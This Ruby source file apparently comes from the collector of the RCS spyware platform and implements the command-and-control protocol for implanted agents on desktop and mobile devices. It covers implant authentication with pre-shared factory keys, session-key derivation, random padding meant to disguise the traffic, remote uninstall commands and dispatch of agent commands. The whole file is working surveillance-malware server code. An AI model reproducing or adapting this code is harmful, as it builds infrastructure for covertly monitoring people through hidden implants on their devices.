#
#  The Synchronization REST Protocol
#

# relatives
require_relative 'sessions.rb'
require_relative 'db.rb'
require_relative 'commands.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/crypt'
require 'rcs-common/pascalize'

# system
require 'securerandom'
require 'digest/sha1'
require 'openssl'
require 'base64'

module RCS
module Collector

class Protocol
  extend RCS::Tracer
  extend RCS::Crypt
  extend RCS::Collector::Commands

  MIN_ANON_VERSION = '2013031101'
  PLATFORMS = ["WINDOWS", "WINMO", "OSX", "IOS", "BLACKBERRY", "SYMBIAN", "ANDROID", "LINUX"]

  def self.authenticate(peer, uri, content, anon_version)
    # choose between the correct authentication to use based on the packet size
    content.length > 128 ? authenticate_scout(peer, uri, content, anon_version) : authenticate_elite(peer, uri, content, anon_version)
  end

  # Authentication phase
  # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, Platform, sha1 ( BuildId, InstanceId, Platform, Cb ) )
  # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
  def self.authenticate_elite(peer, uri, content, anon_version)
    trace :info, "[#{peer}] Authentication required for (#{content.length.to_s} bytes)..."

    # integrity check (104 byte of data, 112 padded)
    # consider random extra data to disguise the protocol
    # random bytes < 16 are appended to the message
    return unless (112..112+16).include? content.length

    # normalize message, chopping random extra data, smaller than 16 bytes
    content, has_rand_block = normalize(content)
    trace :debug, "[#{peer}] Auth packet size is #{content.length.to_s} bytes"
    
    # decrypt the message with the per customer signature
    begin
      # the NO_PAD is needed because zeno (Fabrizio Cornelli) has broken his code
      # from RCS 7.x to RCS daVinci. He owes me a beer :)
      # ind this case the length is 112
      message = aes_decrypt(content, DB.instance.agent_signature, RCS::Crypt::PAD_NOPAD)
    rescue Exception => e
      trace :error, "[#{peer}] Invalid message decryption: #{e.message}"
      return
    end

    # first part of the session key, chosen by the client
    # it will be used to derive the session key later along with Ks (server chosen)
    # and the Cb (pre-shared conf key)
    kd = message.slice!(0..15)
    trace :debug, "[#{peer}] Auth -- Kd: " << kd.unpack('H*').to_s

    # the client NOnce that has to be returned by the server
    # this is used to authenticate the server
    # returning it crypted with the session key it will confirm the
    # authenticity of the server
    nonce = message.slice!(0..15)
    trace :debug, "[#{peer}] Auth -- Nonce: " << nonce.unpack('H*').to_s

    # the build_id identification
    build_id = message.slice!(0..15)
    build_id_real = build_id.delete("\x00")
    # substitute the first 4 chars with RCS_ because of the client side scrambling
    build_id_real[0..3] = 'RCS_'
    trace :info, "[#{peer}] Auth -- BuildId: " << build_id_real

    # check that the ident is decrypted correctly (it only has RCS_ and numbers)
    if Regexp.new('(RCS_)([0-9]{10})', Regexp::IGNORECASE).match(build_id_real).nil?
      trace :error, "[#{peer}] Auth -- Invalid BuildId. Possible decryption issue."
      return
    end

    # instance of the device
    instance_id = message.slice!(0..19)
    trace :info, "[#{peer}] Auth -- InstanceId: " << instance_id.unpack('H*').first

    # platform of the device
    platform = message.slice!(0..15)
    trace :info, "[#{peer}] Auth -- platform: " << platform.delete("\x00")
    
    # identification digest
    sha = message.slice!(0..19)
    trace :debug, "[#{peer}] Auth -- sha: " << sha.unpack('H*').to_s
    
    # get the factory key from the db
    conf_key = DB.instance.factory_key_of build_id_real

    # this class does not exist
    if conf_key.nil?
      trace :warn, "[#{peer}] Factory key #{build_id_real} not found"
      return
    end

    # the server will calculate the same sha digest and authenticate the agent
    # since the conf key is pre-shared
    sha_check = Digest::SHA1.digest(build_id + instance_id + platform + conf_key)
    trace :debug, "[#{peer}] Auth -- sha_check: " << sha_check.unpack('H*').to_s

    # identification failed
    unless sha.eql? sha_check
      trace :warn, "[#{peer}] Invalid identification"
      return
    end

    trace :info, "[#{peer}] Authentication phase 1 completed"

    # remove the trailing zeroes from the strings
    instance_id = instance_id.unpack('H*').first.downcase
    platform.delete!("\x00")
    demo = platform.end_with? '-DEMO'
    platform.gsub!(/-DEMO/, '')
    scout = false

    # random key part chosen by the server
    ks = SecureRandom.random_bytes(16)
    trace :debug, "[#{peer}] Auth -- Ks: " << ks.unpack('H*').to_s

    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
    # we use a schema like PBKDF1
    k = Digest::SHA1.digest(conf_key + ks + kd)
    trace :debug, "[#{peer}] Auth -- K: " << k.unpack('H*').to_s

    # prepare the response:
    # Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response )
    message = aes_encrypt(ks, DB.instance.agent_signature)

    # ask the database the status of the agent
    status, aid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)

    # here we have to deny the sync in case the agent and the anon are different:
    # good and good -> ok
    # bad and bad -> ok
    # bad and good -> NOT OK
    # this is done to prevent compromised agent to sync on new (good) anons
    if (good ^ (anon_version >= MIN_ANON_VERSION))
      trace :warn, "[#{peer}] Agent trying to sync on wrong anon (#{good}, #{anon_version})"
      return
    end

    response = [Commands::PROTO_NO].pack('I')
    # what to do based on the agent status
    case status
      when DB::UNKNOWN_AGENT
        # if not sure, close the connection
        trace :info, "[#{peer}] Unknown agent status, closing..."
        return
      when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
        response = [Commands::PROTO_UNINSTALL].pack('I')
        trace :info, "[#{peer}] Uninstall command sent (#{status})"
        DB.instance.agent_uninstall(aid)
      when DB::QUEUED_AGENT
        response = [Commands::PROTO_NO].pack('I')
        trace :warn, "[#{peer}] was queued for license limit exceeded"
      when DB::ACTIVE_AGENT
        # everything is ok or the db is not connected, proceed
        response = [Commands::PROTO_OK].pack('I')

        # create a valid cookie session
        cookie = SessionManager.instance.create(aid, build_id_real, instance_id, platform, demo, scout, k, peer)

        trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
    end

    # complete the message for the agent
    message += aes_encrypt(nonce + response, k) 
    message += randblock() if has_rand_block

    return message, 'application/octet-stream', cookie
  end

  # Authentication phase
  # ->  Base64 ( Crypt_S ( Pver, Kd, sha(Kc | Kd), BuildId, InstanceId, Platform ) )
  # <-  Base64 ( Crypt_C ( Ks, sha(K), Response ) )  |  SetCookie ( SessionCookie )
  def self.authenticate_scout(peer, uri, content, anon_version)
    trace :info, "[#{peer}] Authentication scout required for (#{content.length.to_s} bytes)..."

    begin
      # remove the base64 container
      resp = Base64.strict_decode64(content)

      # align to the multiple of 16
      resp, has_rand = normalize(resp)

      # decrypt the message
      message = aes_decrypt(resp, DB.instance.agent_signature, RCS::Crypt::PAD_NOPAD)
    rescue Exception => e
      trace :error, "[#{peer}] Invalid message decryption: #{e.message}"
      return
    end

    pver = message.slice!(0..3).unpack('I')
    if pver != [1]
      trace :info, "[#{peer}] Invalid protocol version"
    end

    # first part of the session key, chosen by the client
    # it will be used to derive the session key later along with Ks (server chosen)
    # and the Cb (pre-shared conf key)
    kd = message.slice!(0..15)
    trace :debug, "[#{peer}] Auth -- Kd: " << kd.unpack('H*').to_s

    sha = message.slice!(0..19)
    trace :debug, "[#{peer}] Auth -- sha: " << sha.unpack('H*').to_s

    # the build_id identification
    build_id = message.slice!(0..15)
    build_id_real = build_id.delete("\x00")
    # substitute the first 4 chars with RCS_ because of the client side scrambling
    build_id_real[0..3] = 'RCS_'
    trace :info, "[#{peer}] Auth -- BuildId: " << build_id_real

    # check that the ident is decrypted correctly (it only has RCS_ and numbers)
    if Regexp.new('(RCS_)([0-9]{10})', Regexp::IGNORECASE).match(build_id_real).nil?
      trace :error, "[#{peer}] Auth -- Invalid BuildId. Possible decryption issue."
      return
    end

    # get the factory key from the db
    conf_key = DB.instance.factory_key_of build_id_real

    # this class does not exist
    if conf_key.nil?
      trace :warn, "[#{peer}] Factory key #{build_id_real} not found"
      return
    end

    # the server will calculate the same sha digest and authenticate the agent
    # since the conf key is pre-shared
    sha_check = Digest::SHA1.digest(conf_key + kd)
    trace :debug, "[#{peer}] Auth -- sha_check: " << sha_check.unpack('H*').to_s

    # identification failed
    unless sha.eql? sha_check
      trace :warn, "[#{peer}] Invalid identification"
      return
    end

    trace :info, "[#{peer}] Authentication phase 1 completed"

    # instance of the device
    instance_id = message.slice!(0..19)
    # remove the trailing zeroes from the strings
    instance_id = instance_id.unpack('H*').first.downcase
    trace :info, "[#{peer}] Auth -- InstanceId: " << instance_id

    # platform of the device
    platform = PLATFORMS[message.slice!(0).unpack('C').first]
    trace :info, "[#{peer}] Auth -- platform: " << platform

    demo = message.slice!(0).unpack('C')
    demo = (demo.first == 1) ? true : false
    trace :debug, "[#{peer}] Auth -- demo: " << demo.to_s

    scout = message.slice!(0).unpack('C')
    scout = (scout.first == 1) ? true : false
    trace :debug, "[#{peer}] Auth -- scout: " << scout.to_s

    flags = message.slice!(0).unpack('C')
    trace :debug, "[#{peer}] Auth -- flags: " << flags.to_s

    # random key part chosen by the server
    ks = SecureRandom.random_bytes(16)
    trace :debug, "[#{peer}] Auth -- Ks: " << ks.unpack('H*').to_s

    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
    # we use a schema like PBKDF1
    k = Digest::SHA1.digest(conf_key + ks + kd)
    trace :debug, "[#{peer}] Auth -- K: " << k.unpack('H*').to_s

    # ask the database the status of the agent
    status, bid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)

    # here we have to deny the sync in case the agent and the anon are different:
    # good and good -> ok
    # bad and bad -> ok
    # bad and good -> NOT OK
    # this is done to prevent compromised agent to sync on new (good) anons
    if (good ^ (anon_version >= MIN_ANON_VERSION))
      trace :warn, "Agent trying to sync on wrong anon (#{good}, #{anon_version})"
      return
    end

    response = [Commands::PROTO_NO].pack('I')
    # what to do based on the agent status
    case status
      when DB::UNKNOWN_AGENT
        # if not sure, close the connection
        trace :info, "[#{peer}] Unknown agent status, closing..."
        return
      when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
        response = [Commands::PROTO_UNINSTALL].pack('I')
        trace :info, "[#{peer}] Uninstall command sent (#{status})"
        DB.instance.agent_uninstall(bid)
      when DB::QUEUED_AGENT
        response = [Commands::PROTO_NO].pack('I')
        trace :warn, "[#{peer}] was queued for license limit exceeded"
      when DB::ACTIVE_AGENT
        # everything is ok or the db is not connected, proceed
        response = [Commands::PROTO_OK].pack('I')

        # create a valid cookie session
        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, demo, scout, k, peer)

        trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
    end

    # prepare the response:
    message = ks + Digest::SHA1.digest(k + ks) + response + SecureRandom.random_bytes(8)

    # complete the message for the agent
    enc_msg = aes_encrypt(message, conf_key, RCS::Crypt::PAD_NOPAD)

    # add the random block
    enc_msg += SecureRandom.random_bytes(rand(128..1024))

    # add the base64 container
    enc_msg = Base64.strict_encode64(enc_msg)

    return enc_msg, 'application/octet-stream', cookie
  end

  def self.valid_authentication(peer, cookie)

    # check if the cookie was created correctly and if it is still valid
    valid = SessionManager.instance.check(cookie)

    if valid
      session = SessionManager.instance.get(cookie)
      trace :debug, "[#{session[:ip]}][#{cookie}] Authenticated"
    else
      trace :warn, "[#{peer}][#{cookie}] Invalid cookie"
    end

    return valid
  end

  def self.commands(peer, cookie, content)
    # retrieve the session
    session = SessionManager.instance.get cookie

    # invalid session
    if session.nil?
      trace :warn, "[#{peer}][#{cookie}] Invalid session"
      return
    end

    # retrieve the peer form the session
    if peer != session[:ip]
      trace :debug, "[#{peer}] has forwarded the connection for [#{session[:ip]}]"
      peer = session[:ip]
    end
    
    # normalize message
    content, has_rand_block = normalize(content)

    begin
      # decrypt the message
      begin
        message = aes_decrypt_integrity(content, session[:key])
      rescue OpenSSL::Cipher::CipherError
        # the NO_PAD is needed because zeno (Fabrizio Cornelli) has broken his code
        # from RCS < 7.6 to RCS daVinci. He owes me a another beer :)
        trace :warn, "[#{peer}][#{cookie}] Invalid message decryption: trying with no pad..."
        message = aes_decrypt_integrity(content, session[:key], RCS::Crypt::PAD_NOPAD)
      end
    rescue Exception => e
      trace :error, "[#{peer}][#{cookie}] Invalid message decryption: #{e.message}"
      return
    end

    # get the command (slicing the message)
    command = message.slice!(0..3)

    # retrieve the type of the command
    command = command.unpack('I').first.to_i

    # invoke the right method for parsing
    if Commands::LOOKUP[command].nil?
      trace :warn, "[#{peer}][#{cookie}] unknown command [#{command}]"
      return
    else
      response = self.send Commands::LOOKUP[command], peer, session, message
    end

    begin
      # crypt the message with the session key
      response = aes_encrypt_integrity(response, session[:key])
    rescue
      trace :error, "[#{peer}][#{cookie}] Invalid message encryption"
      return
    end

    response += randblock() if has_rand_block
    
    return response, 'application/octet-stream', cookie
  end

  # returns a random block of random size < 16
  def self.randblock()
    return SecureRandom.random_bytes(SecureRandom.random_number(16))
  end
  
  # normalize a message, cutting at the shorter size multiple of 16
  def self.normalize(content)
    newlen = content.length - (content.length % 16)
    has_rand_block = newlen != content.length
    
    content = content[0..(newlen -1)]
    return content, has_rand_block
  end
  
  # the protocol is parsed here
  # there are only two phases:
  #   - Authentication
  #   - Commands
  def self.parse(peer, uri, cookie, content, anon_version)

    # if the request does not contains any cookies,
    # we need to perform authentication first
    return authenticate(peer, uri, content, anon_version) if cookie.nil?

    # we have a cookie, check if it's valid
    return unless valid_authentication(peer, cookie)

    # the agent has been authenticated, parse the commands it sends
    return commands(peer, cookie, content)
  end


end #Protocol

end #Collector::
end #RCS::